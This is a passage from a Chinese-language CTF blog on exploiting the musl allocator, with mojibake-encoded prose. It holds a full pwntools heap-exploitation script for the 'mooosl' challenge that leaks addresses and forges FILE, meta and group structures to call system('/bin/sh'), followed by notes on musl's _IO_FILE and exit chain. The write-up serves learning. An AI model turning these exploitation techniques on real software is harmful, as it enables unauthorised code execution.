<p>è¿™ä¸€æ­¥æ˜¯å¸¸è§„æ­¥éª¤ï¼Œæˆ‘ä»¬å°†ä¼ªé€ çš„<code>FILE</code>ç»“æ„ä½“ã€ä¼ªé€ çš„<code>meta</code>ã€<code>group</code>ã€<code>chunk</code>æ”¾åœ¨ä¸€ä¸ªchunkä¸­ï¼Œæ³¨æ„<code>meta_area</code>éœ€è¦é¡µå¯¹é½ï¼Œå¹¶åœ¨é¡µé¦–éƒ¨å†™å…¥<code>secret</code>å€¼ã€‚</p>
<p>å†™å…¥ä¹‹åï¼Œæˆ‘ä»¬æƒ³åŠæ³•é‡Šæ”¾å‡çš„chunkï¼Œæ–¹æ³•æ˜¯å°†åŸæ¥ç”¨äºleakçš„chunkåˆ†é…å‡ºå»ï¼Œç„¶åä¿®æ”¹å†…éƒ¨æŒ‡é’ˆçš„å€¼ï¼Œå†é€šè¿‡deleteåˆ é™¤å³å¯ã€‚ç„¶åå°±å¯ä»¥åˆ©ç”¨unlinkä¿®æ”¹stderræŒ‡é’ˆçš„å€¼ä¸ºæˆ‘ä»¬çš„å‡chunkã€‚ä½†æ˜¯å¾ˆä¸å¹¸çš„æ˜¯ï¼ŒstderræŒ‡é’ˆæ‰€åœ¨çš„æ®µæ˜¯åªè¯»çš„ï¼Œæˆ‘ä¸çŸ¥é“ä¸ºä»€ä¹ˆå¾ˆå¤šçš„æ–‡ç« éƒ½è¯´è¦ä¿®æ”¹è¿™ä¸ªåœ°æ–¹ï¼Œä½†æ˜¯è¿™é‡Œä¸èƒ½æ”¹ï¼Œå¦‚æœèƒ½æ”¹çš„è¯æ˜¯è‚¯å®šå¯ä»¥è¿‡çš„ã€‚ä¹Ÿå°±æ˜¯æœ€åä¸€æ¬¡deleteæ— æ³•å®Œæˆã€‚</p>
<p>exp:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./mooosl&#x27;</span>, env=&#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>: <span class="string">&#x27;libc.so&#x27;</span>&#125;)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./mooosl&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">att = <span class="keyword">lambda</span>: gdb.attach(io)</span><br><span class="line">sleep = <span class="keyword">lambda</span>: time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">content: <span class="built_in">bytes</span></span>):</span><br><span class="line">    res = <span class="number">2021</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(content)):</span><br><span class="line">        res = res * <span class="number">0x13377331</span> + <span class="built_in">ord</span>(content.decode()[i])</span><br><span class="line">        res %= <span class="number">0x1_0000_0000</span></span><br><span class="line">    <span class="keyword">return</span> res &amp; <span class="number">0xFFF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_original</span>(<span class="params">content: <span class="built_in">bytes</span></span>):</span><br><span class="line">    res = <span class="number">2021</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(content)):</span><br><span class="line">        res = res * <span class="number">0x13377331</span> + <span class="built_in">ord</span>(content.decode()[i])</span><br><span class="line">        res %= <span class="number">0x1_0000_0000</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">store</span>(<span class="params">key_content, value_content, key_size = <span class="literal">None</span>, value_size = <span class="literal">None</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;option: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> key_size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        sla(<span class="string">b&#x27;key size: &#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(key_content)).encode())</span><br><span class="line">        sa(<span class="string">b&#x27;key content: &#x27;</span>, key_content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sla(<span class="string">b&#x27;key size: &#x27;</span>, <span class="built_in">str</span>(key_size).encode())</span><br><span class="line">        sa(<span class="string">b&#x27;key content: &#x27;</span>, key_content)</span><br><span class="line">    <span class="keyword">if</span> value_size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        sla(<span class="string">b&#x27;value size: &#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(value_content)).encode())</span><br><span class="line">        sa(<span class="string">b&#x27;value content: &#x27;</span>, value_content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sla(<span class="string">b&#x27;value size: &#x27;</span>, <span class="built_in">str</span>(value_size).encode())</span><br><span class="line">        sa(<span class="string">b&#x27;value content: &#x27;</span>, value_content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">query</span>(<span class="params">key_content, key_size = <span class="literal">None</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;option: &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> key_size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        sla(<span class="string">b&#x27;key size: &#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(key_content)).encode())</span><br><span class="line">        sa(<span class="string">b&#x27;key content: &#x27;</span>, key_content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sla(<span class="string">b&#x27;key size: &#x27;</span>, <span class="built_in">str</span>(key_size).encode())</span><br><span class="line">        sa(<span class="string">b&#x27;key content: &#x27;</span>, key_content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">key_content</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;option: &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;key size: &#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(key_content)).encode())</span><br><span class="line">    sa(<span class="string">b&#x27;key content: &#x27;</span>, key_content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_collision</span>(<span class="params">victim: <span class="built_in">bytes</span></span>):</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    target = encrypt(victim)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> encrypt(<span class="built_in">str</span>(i).encode()) == target <span class="keyword">and</span> <span class="built_in">str</span>(i).encode() != victim:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">str</span>(i).encode()</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hex2bytes</span>(<span class="params">content: <span class="built_in">bytes</span></span>):</span><br><span class="line">    res = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(content) // <span class="number">2</span>):</span><br><span class="line">        res += p8(<span class="built_in">int</span>(content.decode()[i*<span class="number">2</span>], <span class="number">16</span>) * <span class="number">0x10</span> + <span class="built_in">int</span>(content.decode()[i*<span class="number">2</span>+<span class="number">1</span>], <span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">                                                    <span class="comment"># 6543210</span></span><br><span class="line">store(<span class="string">b&#x27;A&#x27;</span>, <span class="string">b&#x27;9889&#x27;</span>)                                <span class="comment"># AAAAAAU</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)                              <span class="comment"># AFFFFFU</span></span><br><span class="line">store(<span class="string">b&#x27;B&#x27;</span>, <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)                            <span class="comment"># UAAAAUU</span></span><br><span class="line">store(find_collision(<span class="string">b&#x27;B&#x27;</span>), <span class="string">b&#x27;B&#x27;</span>)                   <span class="comment"># UAAAUUU</span></span><br><span class="line">delete(<span class="string">b&#x27;B&#x27;</span>)                                        <span class="comment"># FAAAUFU</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)                              <span class="comment"># FFFFUFU -&gt; AAAAUAU</span></span><br><span class="line">store(<span class="string">b&#x27;C&#x27;</span>, <span class="string">b&#x27;C&#x27;</span> * <span class="number">0x1000</span>)                          <span class="comment"># AAAUUUU</span></span><br><span class="line">query(<span class="string">b&#x27;B&#x27;</span>)</span><br><span class="line"></span><br><span class="line">leak = hex2bytes(io.recvline().split(<span class="string">b&quot;:&quot;</span>)[<span class="number">1</span>])</span><br><span class="line">group_addr = u64(leak[<span class="number">0</span>:<span class="number">8</span>]) - <span class="number">0x70</span></span><br><span class="line">smallchunk = group_addr + <span class="number">0x30</span></span><br><span class="line">mmap_addr = u64(leak[<span class="number">8</span>:<span class="number">16</span>]) - <span class="number">0x20</span></span><br><span class="line">enc = u64(leak[<span class="number">32</span>:<span class="number">40</span>]) - <span class="number">1</span></span><br><span class="line">libc_base = mmap_addr + <span class="number">0x4000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;B&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(p64(smallchunk) + p64(group_addr) + p64(<span class="number">1</span>) + p64(<span class="number">0x30</span>) + p64(enc) + p64(<span class="number">0</span>), key_size=<span class="number">0x30</span>)</span><br><span class="line">query(<span class="string">b&#x27;B&#x27;</span>)</span><br><span class="line"></span><br><span class="line">leak = hex2bytes(io.recvline().split(<span class="string">b&quot;:&quot;</span>)[<span class="number">1</span>])</span><br><span class="line">meta_addr = u64(leak[<span class="number">0</span>:<span class="number">8</span>])</span><br><span class="line">meta_area = meta_addr &amp; <span class="number">0xFFFF_FFFF_FFFF_F000</span></span><br><span class="line">info(<span class="string">&#x27;meta_area: &#x27;</span> + <span class="built_in">hex</span>(meta_area))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;B&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(p64(smallchunk) + p64(meta_area) + p64(<span class="number">1</span>) + p64(<span class="number">0x30</span>) + p64(enc) + p64(<span class="number">0</span>), key_size=<span class="number">0x30</span>)</span><br><span class="line">query(<span class="string">b&#x27;B&#x27;</span>)</span><br><span class="line"></span><br><span class="line">leak = hex2bytes(io.recvline().split(<span class="string">b&quot;:&quot;</span>)[<span class="number">1</span>])</span><br><span class="line">secret = u64(leak[<span class="number">0</span>:<span class="number">8</span>])</span><br><span class="line">info(<span class="string">&#x27;secret: &#x27;</span> + <span class="built_in">hex</span>(secret))</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">stderr = libc_base + libc.symbols[<span class="string">&#x27;stderr&#x27;</span>]</span><br><span class="line">stdout = libc_base + libc.symbols[<span class="string">&#x27;stdout&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    query(<span class="string">b&#x27;B&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">fake_file_addr = libc_base - <span class="number">0x3000</span> + <span class="number">0x560</span></span><br><span class="line">fake_meta_addr = libc_base - <span class="number">0x2000</span> + <span class="number">0x10</span></span><br><span class="line">fake_group_addr = libc_base - <span class="number">0x2000</span> + <span class="number">0x40</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># key</span></span><br><span class="line">key = p64(group_addr + <span class="number">0x20</span>)</span><br><span class="line">key += p64(fake_group_addr + <span class="number">0x10</span>)</span><br><span class="line">key += p64(<span class="number">4</span>)</span><br><span class="line">key += p64(<span class="number">0x30</span>)</span><br><span class="line">key += p64(encrypt_original(find_collision(find_collision(<span class="string">b&#x27;B&#x27;</span>))))</span><br><span class="line">key += p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">fake_file = <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) * <span class="number">6</span></span><br><span class="line">fake_file += p64(<span class="number">1</span>)     <span class="comment"># wbase</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)</span><br><span class="line">fake_file += p64(system)    <span class="comment"># write</span></span><br><span class="line"></span><br><span class="line">maplen = <span class="number">1</span></span><br><span class="line">sizeclass = <span class="number">8</span></span><br><span class="line">last_idx = <span class="number">0</span></span><br><span class="line">freeable = <span class="number">1</span></span><br><span class="line">fake_meta = p64(fake_group_addr + <span class="number">0x10</span> + <span class="number">0x80</span>)      <span class="comment"># prev</span></span><br><span class="line">fake_meta += p64(stderr)                            <span class="comment"># next</span></span><br><span class="line">fake_meta += p64(fake_group_addr)                   <span class="comment"># fake_meta-&gt;mem</span></span><br><span class="line">fake_meta += p64(<span class="number">0</span>)                                 <span class="comment"># fake_meta-&gt;avail_mask</span></span><br><span class="line">fake_meta += p64(last_idx + (freeable &lt;&lt; <span class="number">5</span>) + (sizeclass &lt;&lt; <span class="number">6</span>) + (maplen &lt;&lt; <span class="number">12</span>))</span><br><span class="line">fake_meta += p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">fake_group = p64(fake_meta_addr)</span><br><span class="line">fake_group += p64(<span class="number">1</span>)</span><br><span class="line">fake_group += p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">value = fake_file.ljust(<span class="number">0x1000</span> - <span class="number">0x560</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">value += p64(secret).ljust(<span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">value += fake_meta</span><br><span class="line">value += fake_group</span><br><span class="line">value += <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x530</span></span><br><span class="line"></span><br><span class="line">store(key, value, key_size=<span class="number">0x30</span>, value_size=<span class="built_in">len</span>(value))</span><br><span class="line"><span class="comment"># query(p64(group_addr + 0x20) + p64(fake_group_addr + 0x90) + p64(4) + p64(0x30) +</span></span><br><span class="line"><span class="comment">#       p64(encrypt_original(find_collision(find_collision(b&#x27;B&#x27;)))) + p64(0), key_size=0x30)</span></span><br><span class="line">info(<span class="string">&#x27;fake chunk address: &#x27;</span> + <span class="built_in">hex</span>(fake_group_addr + <span class="number">0x90</span>))</span><br><span class="line">info(<span class="string">&#x27;stderr: &#x27;</span> + <span class="built_in">hex</span>(stderr))</span><br><span class="line">info(<span class="string">&#x27;group address: &#x27;</span> + <span class="built_in">hex</span>(group_addr))</span><br><span class="line">info(<span class="string">&#x27;mmap space: &#x27;</span> + <span class="built_in">hex</span>(mmap_addr))</span><br><span class="line">delete(find_collision(find_collision(<span class="string">b&#x27;B&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/musl-pwn-%E5%85%A5%E9%97%A8-3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/musl-pwn-%E5%85%A5%E9%97%A8-3/" class="post-title-link" itemprop="url">musl pwn å…¥é—¨ (3)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:41:27" itemprop="dateCreated datePublished" datetime="2023-02-28T22:41:27+08:00">2023-02-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-01 11:31:11" itemprop="dateModified" datetime="2023-03-01T11:31:11+08:00">2023-03-01</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">å­¦ä¹ ç¬”è®°</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/musl-pwn-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">musl pwn ç³»åˆ—</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>15k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>13 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>åœ¨ä¸Šä¸€ç¯‡æ–‡ç« ä¸­ï¼Œæˆ‘ä»¬è¯¦ç»†åˆ†æäº†å¦‚ä½•é€šè¿‡muslçš„å†…å­˜åˆ†é…ç³»ç»Ÿå®ç°ä»»æ„ä¸¤ä¸ªåœ°å€äº’ç›¸å†™çš„åˆ©ç”¨ã€‚æœ¬æ–‡æ®æ­¤è®¨è®ºåº”è¯¥å¦‚ä½•ä½¿ç”¨è¿™ç§æ–¹å¼getshellã€‚</p>
<p>é¦–å…ˆçœ‹åˆ°muslä¸­çš„<code>_IO_FILE</code>ç»“æ„ä½“ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">	<span class="type">unsigned</span> flags;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> *rpos, *rend;</span><br><span class="line">	<span class="type">int</span> (*close)(FILE *);</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> *wend, *wpos;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> *mustbezero_1;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> *wbase;</span><br><span class="line">	<span class="type">size_t</span> (*read)(FILE *, <span class="type">unsigned</span> <span class="type">char</span> *, <span class="type">size_t</span>);</span><br><span class="line">	<span class="type">size_t</span> (*write)(FILE *, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *, <span class="type">size_t</span>);</span><br><span class="line">	<span class="type">off_t</span> (*seek)(FILE *, <span class="type">off_t</span>, <span class="type">int</span>);</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> *buf;</span><br><span class="line">	<span class="type">size_t</span> buf_size;</span><br><span class="line">	FILE *prev, *next;</span><br><span class="line">	<span class="type">int</span> fd;</span><br><span class="line">	<span class="type">int</span> pipe_pid;</span><br><span class="line">	<span class="type">long</span> lockcount;</span><br><span class="line">	<span class="type">int</span> mode;</span><br><span class="line">	<span class="keyword">volatile</span> <span class="type">int</span> lock;</span><br><span class="line">	<span class="type">int</span> lbf;</span><br><span class="line">	<span class="type">void</span> *cookie;</span><br><span class="line">	<span class="type">off_t</span> off;</span><br><span class="line">	<span class="type">char</span> *getln_buf;</span><br><span class="line">	<span class="type">void</span> *mustbezero_2;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> *shend;</span><br><span class="line">	<span class="type">off_t</span> shlim, shcnt;</span><br><span class="line">	FILE *prev_locked, *next_locked;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> __<span class="title">locale_struct</span> *<span class="title">locale</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­æœ‰4ä¸ªå‡½æ•°æŒ‡é’ˆ<code>close</code>ã€<code>read</code>ã€<code>write</code>ã€<code>seek</code>ã€‚åœ¨è§£é¢˜æ—¶ï¼Œæ ‡å‡†è¾“å…¥è¾“å‡ºçš„ä¸‰ä¸ª<code>FILE</code>ç»“æ„ä½“ï¼š<code>stdin</code>ã€<code>stdout</code>ã€<code>stderr</code>æ˜¯æˆ‘ä»¬åˆ©ç”¨çš„é‡ç‚¹ã€‚é¦–å…ˆæˆ‘ä»¬éœ€è¦äº†è§£muslçš„exitå‡½æ•°è°ƒç”¨é“¾ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">_Noreturn</span> <span class="type">void</span> <span class="title function_">exit</span><span class="params">(<span class="type">int</span> code)</span></span><br><span class="line">&#123;</span><br><span class="line">	__funcs_on_exit();</span><br><span class="line">	__libc_exit_fini();</span><br><span class="line">	__stdio_exit();</span><br><span class="line">	_Exit(code);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __stdio_exit(<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">	FILE *f;</span><br><span class="line">	<span class="keyword">for</span> (f=*__ofl_lock(); f; f=f-&gt;next) close_file(f);</span><br><span class="line">	close_file(__stdin_used);</span><br><span class="line">	close_file(__stdout_used);</span><br><span class="line">	close_file(__stderr_used);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">close_file</span><span class="params">(FILE *f)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (!f) <span class="keyword">return</span>;</span><br><span class="line">	FFINALLOCK(f);</span><br><span class="line">	<span class="keyword">if</span> (f-&gt;wpos != f-&gt;wbase) f-&gt;write(f, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (f-&gt;rpos != f-&gt;rend) f-&gt;seek(f, f-&gt;rpos-f-&gt;rend, SEEK_CUR);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>exit</code><br />
â€ƒâ€ƒ<code>__stdio_exit</code><br />
â€ƒâ€ƒâ€ƒâ€ƒ<code>close_file</code></p>
</blockquote>
